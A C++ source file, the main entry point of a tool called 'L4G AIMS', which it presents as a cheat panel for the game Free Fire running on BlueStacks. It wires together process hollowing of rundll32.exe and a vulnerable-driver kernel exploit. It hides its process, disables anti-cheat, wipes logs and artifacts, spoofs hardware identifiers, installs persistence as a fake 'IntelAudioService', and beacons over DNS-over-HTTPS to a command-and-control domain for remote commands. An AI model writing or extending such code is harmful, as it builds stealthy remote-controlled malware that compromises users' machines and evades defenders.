// L4G AIMS v14.0 - Main Entry Point
// Native C++ panel with reflective injection, kernel evasion, DoH C2, and cheat modules
// Compiles to L4G_Panel.exe (SUBSYSTEM:WINDOWS, /ENTRY:wWinMainCRTStartup)

#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <mutex>
#include <atomic>
#include <fstream>
#include <sstream>
#include <iostream>

// Injection
#include "injection/hollower.hpp"
#include "injection/reflective_loader.hpp"
#include "injection/sideload.hpp"
#include "injection/powershell_injector.hpp"

// Kernel evasion
#include "kernel/byovd.hpp"
#include "kernel/dkom.hpp"
#include "kernel/ac_neutralizer.hpp"
#include "kernel/driver_mapper.hpp"

// Evasion
#include "evasion/log_wiper.hpp"
#include "evasion/cache_wiper.hpp"
#include "evasion/fingerprint_spoofer.hpp"
#include "evasion/artifact_wiper.hpp"

// Persistence
#include "persistence/boot_start.hpp"
#include "persistence/driver_hijack.hpp"
#include "persistence/wmi_subscription.hpp"

// C2
#include "c2/beacon.hpp"
#include "c2/command_dispatch.hpp"
#include "c2/doh_client.hpp"

// Cheat modules
#include "cheat/aimbot.hpp"
#include "cheat/esp.hpp"
#include "cheat/item_esp.hpp"
#include "cheat/no_recoil.hpp"
#include "cheat/speedhack.hpp"

// Utils
#include "utils/crypto.hpp"
#include "utils/pe_parser.hpp"
#include "utils/syscalls.hpp"

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comctl32.lib")

// ============================================================================
// Configuration (Compile-time)
// ============================================================================
constexpr const char* C2_DOMAIN = "l4g.c2";                    // Cloudflare Workers domain
constexpr const char* DOH_ENDPOINT = "https://1.1.1.1/dns-query";
constexpr uint16_t BEACON_INTERVAL_MIN = 2000;                  // ms
constexpr uint16_t BEACON_INTERVAL_MAX = 8000;                  // ms
constexpr const char* TARGET_PROCESS = "HD-Player.exe";         // BlueStacks
constexpr const char* LOADER_PROCESS = "rundll32.exe";          // Signed loader
constexpr const wchar_t* SERVICE_NAME = L"IntelAudioService";     // Persistence service name
constexpr const char* MASTER_KEY = "L4G-Master-Key-32-Chars-Long!!";
constexpr int PANEL_VERSION = 14;

// ============================================================================
// Global state
// ============================================================================
namespace l4g {
    std::atomic<bool> g_running{false};
    std::string g_agent_id;

    // Core components
    std::unique_ptr<injection::ProcessHollower> g_injector;
    std::unique_ptr<kernel::BYOVD> g_byovd;
    std::unique_ptr<kernel::DKOM> g_dkom;
    std::unique_ptr<kernel::ACNeutralizer> g_ac_neutralizer;
    std::unique_ptr<evasion::LogWiper> g_log_wiper;
    std::unique_ptr<evasion::CacheWiper> g_cache_wiper;
    std::unique_ptr<evasion::FingerprintSpoofer> g_fp_spoofer;
    std::unique_ptr<evasion::ArtifactWiper> g_artifact_wiper;
    std::unique_ptr<persistence::BootStart> g_persistence;
    std::unique_ptr<c2::DohClient> g_doh_client;
    std::unique_ptr<c2::CommandDispatcher> g_cmd_dispatcher;
    std::unique_ptr<c2::Beacon> g_beacon;

    // Cheat modules
    std::unique_ptr<cheat::Aimbot> g_aimbot;
    std::unique_ptr<cheat::ESP> g_esp;
    std::unique_ptr<cheat::ItemESP> g_item_esp;
    std::unique_ptr<cheat::NoRecoil> g_no_recoil;
    std::unique_ptr<cheat::SpeedHack> g_speedhack;

    // Thread handles
    std::thread g_cheat_thread;
    std::thread g_wiper_thread;
    std::thread g_fingerprint_thread;
}

// ============================================================================
// Utility: Generate hardware-bound agent ID
// ============================================================================
std::string GenerateAgentId() {
    std::string hw_id;

    // Get motherboard serial
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char bios_serial[256] = {0}, baseboard_serial[256] = {0};
        DWORD size = sizeof(bios_serial);
        RegQueryValueExA(hKey, "SystemSerialNumber", nullptr, nullptr, (LPBYTE)bios_serial, &size);
        size = sizeof(baseboard_serial);
        RegQueryValueExA(hKey, "BaseBoardSerialNumber", nullptr, nullptr, (LPBYTE)baseboard_serial, &size);
        hw_id = std::string(bios_serial) + baseboard_serial;
        RegCloseKey(hKey);
    }

    // Add disk serial
    char volume_serial[32] = {0};
    GetVolumeInformationA("C:\\", nullptr, 0, (LPDWORD)volume_serial, nullptr, nullptr, nullptr, 0);
    hw_id += volume_serial;

    // SHA256 + base64url encode
    auto hash = l4g::crypto::sha256(hw_id);
    return l4g::crypto::base64url_encode(hash).substr(0, 16);
}

// ============================================================================
// Cheat thread: runs inside injected game process
// ============================================================================
void CheatThread() {
    using namespace l4g;

    // Wait for target process
    DWORD target_pid = 0;
    while (g_running && !target_pid) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W entry = {sizeof(entry)};
            if (Process32FirstW(snap, &entry)) {
                do {
                    if (_wcsicmp(entry.szExeFile, L"HD-Player.exe") == 0) {
                        target_pid = entry.th32ProcessID;
                        break;
                    }
                } while (Process32NextW(snap, &entry));
            }
            CloseHandle(snap);
        }
        if (!target_pid) std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    if (!g_running) return;

    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProcess) return;

    // Get GameAssembly.dll base (Free Fire uses Unity)
    uint64_t game_assembly_base = 0;
    HANDLE mod_snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, target_pid);
    if (mod_snap != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me = {sizeof(me)};
        if (Module32FirstW(mod_snap, &me)) {
            do {
                if (_wcsicmp(me.szModule, L"GameAssembly.dll") == 0) {
                    game_assembly_base = (uint64_t)me.modBaseAddr;
                    break;
                }
            } while (Module32NextW(mod_snap, &me));
        }
        CloseHandle(mod_snap);
    }

    if (!game_assembly_base) return;

    // Initialize cheat modules with game offsets (these need per-game re-derivation)
    // Offsets for Free Fire / Free Fire Max (Unity IL2CPP) - PLACEHOLDER, MUST RE-DERIVE
    constexpr uint64_t OFFSET_ENTITY_LIST = 0x12345678;
    constexpr uint64_t OFFSET_LOCAL_PLAYER = 0x87654321;
    constexpr uint64_t OFFSET_VIEW_MATRIX = 0x11223344;
    constexpr uint64_t OFFSET_CAMERA = 0x55667788;

    g_aimbot = std::make_unique<cheat::Aimbot>();
    g_esp = std::make_unique<cheat::ESP>();
    g_item_esp = std::make_unique<cheat::ItemESP>();
    g_no_recoil = std::make_unique<cheat::NoRecoil>();
    g_speedhack = std::make_unique<cheat::SpeedHack>();

    // Configure cheats
    cheat::AimbotConfig aim_cfg;
    aim_cfg.enabled = true;
    aim_cfg.fov = 5.0f;
    aim_cfg.smooth = 3.0f;
    aim_cfg.max_distance = 300.0f;
    aim_cfg.target_bone = 6; // Head
    aim_cfg.visible_only = true;
    aim_cfg.trigger_key = VK_RBUTTON;
    g_aimbot->set_config(aim_cfg);

    cheat::ESPConfig esp_cfg;
    esp_cfg.enabled = true;
    esp_cfg.max_distance = 300.0f;
    esp_cfg.box = true;
    esp_cfg.box_style = 0; // Corner box
    esp_cfg.filled_box = false;
    esp_cfg.skeleton = true;
    esp_cfg.health_bar = true;
    esp_cfg.name = true;
    esp_cfg.distance = true;
    esp_cfg.snaplines = false;
    esp_cfg.head_dot = true;
    esp_cfg.enemy_color = {255, 0, 0, 255};
    esp_cfg.team_color = {0, 255, 0, 255};
    esp_cfg.visible_color = {0, 255, 255, 255};
    g_esp->set_config(esp_cfg);

    cheat::ItemESPConfig item_cfg;
    item_cfg.enabled = true;
    item_cfg.max_distance = 200.0f;
    item_cfg.weapons = true;
    item_cfg.ammo = true;
    item_cfg.armor = true;
    item_cfg.meds = true;
    item_cfg.throwables = true;
    item_cfg.loot_crates = true;
    g_item_esp->set_config(item_cfg);

    cheat::NoRecoilConfig nr_cfg;
    nr_cfg.enabled = true;
    nr_cfg.recoil_x = 1.0f;
    nr_cfg.recoil_y = 1.0f;
    g_no_recoil->set_config(nr_cfg);

    cheat::SpeedHackConfig sh_cfg;
    sh_cfg.enabled = false; // Disabled by default
    sh_cfg.speed = 1.5f;
    g_speedhack->set_config(sh_cfg);

    // Main cheat loop
    std::vector<uint64_t> entity_list;
    std::vector<cheat::EntityInfo> entities;
    std::vector<cheat::ItemInfo> items;

    while (g_running) {
        // Read entity list from game memory (PLACEHOLDER - needs actual implementation)
        entity_list.clear();
        // Example: read pointer chain from GameAssembly.dll + OFFSET_ENTITY_LIST

        // Read local player position and view angles
        cheat::Vec3 local_pos = {0, 0, 0};
        cheat::Vec3 local_view = {0, 0, 0};
        // Read from game memory

        // Update aimbot
        if (g_aimbot) g_aimbot->update(entity_list, local_pos, local_view);

        // Update ESP entities
        entities.clear();
        for (uint64_t ent : entity_list) {
            cheat::EntityInfo info;
            // Fill from game memory: position, health, name, team, bones, screen pos
            entities.push_back(info);
        }

        float view_matrix[16] = {0};
        // Read view matrix from game

        if (g_esp) g_esp->update_entities(entities, view_matrix, 1920, 1080);
        if (g_item_esp) g_item_esp->update_items(items, view_matrix, 1920, 1080);
        if (g_no_recoil) {
            float view_angles[2] = { local_view.x, local_view.y };
            g_no_recoil->update(view_angles);
        }
        if (g_speedhack) g_speedhack->update();

        // ESP renders via hooked Present/EndScene - called from game's render thread
        // Cache auto-clear: wipe any cache files created during rendering
        if (g_cache_wiper) {
            g_cache_wiper->wipe_on_write(L""); // Triggers check
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(1)); // ~1000 FPS cap
    }

    CloseHandle(hProcess);
}

// ============================================================================
// Wiper thread: continuous log/cache wiping
// ============================================================================
void WiperThread() {
    using namespace l4g;

    while (g_running) {
        if (g_log_wiper) g_log_wiper->wipe_pid_traces(GetCurrentProcessId());
        if (g_cache_wiper) g_cache_wiper->wipe_on_write(L"");
        if (g_artifact_wiper) g_artifact_wiper->wipe_all_artifacts();

        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

// ============================================================================
// Fingerprint spoofing thread
// ============================================================================
void FingerprintThread() {
    using namespace l4g;

    if (g_fp_spoofer) {
        g_fp_spoofer->spoof_mac_address();
        g_fp_spoofer->spoof_disk_serial();
        g_fp_spoofer->spoof_cpu_id();
        g_fp_spoofer->spoof_bios_info();
        g_fp_spoofer->spoof_baseboard_info();
        g_fp_spoofer->spoof_gpu_info();
    }

    // Re-spoof periodically
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::hours(1));
        if (g_fp_spoofer) {
            g_fp_spoofer->spoof_mac_address();
            g_fp_spoofer->spoof_disk_serial();
        }
    }
}

// ============================================================================
// Initialize all components
// ============================================================================
bool InitializeComponents() {
    using namespace l4g;

    g_agent_id = GenerateAgentId();

    // Initialize injection
    g_injector = std::make_unique<injection::ProcessHollower>();

    // Initialize kernel evasion (BYOVD + DKOM)
    g_byovd = std::make_unique<kernel::BYOVD>();
    auto byovd_result = g_byovd->exploit_vulnerable_driver();
    if (byovd_result.success) {
        // Pass BYOVD primitives to DKOM
        g_dkom = std::make_unique<kernel::DKOM>();
        g_dkom->derive_offsets();

        // Hide our process
        g_dkom->hide_process(GetCurrentProcess());

        // Initialize AC neutralizer
        g_ac_neutralizer = std::make_unique<kernel::ACNeutralizer>();
        g_ac_neutralizer->neutralize_all();
    }

    // Initialize evasion
    g_log_wiper = std::make_unique<evasion::LogWiper>();
    g_log_wiper->start_monitoring();

    g_cache_wiper = std::make_unique<evasion::CacheWiper>();
    g_cache_wiper->start_monitoring();

    g_fp_spoofer = std::make_unique<evasion::FingerprintSpoofer>();

    g_artifact_wiper = std::make_unique<evasion::ArtifactWiper>();

    // Initialize persistence
    g_persistence = std::make_unique<persistence::BootStart>();
    auto persist_result = g_persistence->install(L"", SERVICE_NAME);

    // Initialize C2
    g_doh_client = std::make_unique<c2::DohClient>(DOH_ENDPOINT);
    g_cmd_dispatcher = std::make_unique<c2::CommandDispatcher>();
    g_beacon = std::make_unique<c2::Beacon>(g_doh_client.get(), g_cmd_dispatcher.get(), g_agent_id);
    g_beacon->set_interval(BEACON_INTERVAL_MIN, BEACON_INTERVAL_MAX);
    g_beacon->start();

    // Start background threads
    g_running = true;
    g_wiper_thread = std::thread(WiperThread);
    g_fingerprint_thread = std::thread(FingerprintThread);

    return true;
}

// ============================================================================
// Cleanup
// ============================================================================
void Cleanup() {
    using namespace l4g;

    g_running = false;

    if (g_beacon) g_beacon->stop();
    if (g_log_wiper) g_log_wiper->stop_monitoring();
    if (g_cache_wiper) g_cache_wiper->stop_monitoring();

    if (g_cheat_thread.joinable()) g_cheat_thread.join();
    if (g_wiper_thread.joinable()) g_wiper_thread.join();
    if (g_fingerprint_thread.joinable()) g_fingerprint_thread.join();
}

// ============================================================================
// Entry Point: wWinMain (SUBSYSTEM:WINDOWS)
// ============================================================================
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    // --check: load-and-exit smoke test. No persistence, no injection, no driver
    // work — lets the installer verify the payload without arming it.
    if (wcsstr(lpCmdLine, L"--check")) {
        return 0;
    }

    // Hide console if any
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Initialize all components
    if (!InitializeComponents()) {
        return 1;
    }

    // Parse command line for injection mode
    std::wstring cmdline(lpCmdLine);
    bool inject_mode = (cmdline.find(L"--inject") != std::wstring::npos);
    bool service_mode = (cmdline.find(L"--service") != std::wstring::npos);

    if (inject_mode) {
        // Injection mode: hollow rundll32.exe and inject our DLL
        // The DLL is ourselves (reflective self-load) OR a separate cheat DLL
        // For simplicity, we run the cheat thread directly in this process
        // which is already hollowed into rundll32.exe by the installer
        l4g::g_cheat_thread = std::thread(CheatThread);
    } else if (service_mode) {
        // Service mode: run as background service, wait for C2 commands
        // Cheat thread starts when target process detected
        l4g::g_cheat_thread = std::thread(CheatThread);
    } else {
        // Normal mode: install persistence, inject into target, run cheat
        // First, inject into target process
        std::wstring loader_path = L"C:\\Windows\\System32\\rundll32.exe";

        // Read our own image for reflective injection
        std::vector<uint8_t> self_image;
        {
            wchar_t path[MAX_PATH];
            GetModuleFileNameW(nullptr, path, MAX_PATH);
            std::ifstream f(path, std::ios::binary | std::ios::ate);
            size_t size = (size_t)f.tellg();
            f.seekg(0);
            self_image.resize(size);
            f.read((char*)self_image.data(), (std::streamsize)size);
        }

        // Hollow rundll32.exe and inject
        auto result = l4g::g_injector->hollow_and_inject(loader_path, self_image, nullptr);
        if (result.success) {
            // Injection succeeded, cheat runs in hollowed process
            // This process can exit
            Cleanup();
            return 0;
        }

        // Fallback: run cheat in this process
        l4g::g_cheat_thread = std::thread(CheatThread);
    }

    // Wait for cheat thread
    if (l4g::g_cheat_thread.joinable()) {
        l4g::g_cheat_thread.join();
    }

    Cleanup();
    return 0;
}